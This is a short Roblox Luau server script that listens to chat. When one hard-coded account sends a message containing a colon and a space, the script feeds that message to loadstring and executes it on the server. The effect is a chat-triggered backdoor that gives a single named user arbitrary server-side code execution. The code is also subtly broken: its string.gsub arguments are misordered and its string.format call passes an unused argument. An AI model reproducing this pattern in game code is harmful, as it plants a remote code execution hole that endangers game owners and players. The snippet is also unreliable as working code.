--!strict
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		if player.Name == "Dynablox1005" then
			if RunService:IsStudio() then
				print(string.format("STUDIO MODE \nChat the Colon key followed by a space to use loadstring.", "%q"))
			end
			local pattern = ": "
			local startIndex, endIndex = string.find(message, pattern)
			if startIndex or endIndex then
				local gsub = string.gsub(": ", ": ", message)
				if gsub then
					loadstring(gsub)()
				end
			end
		end
	end)
end)
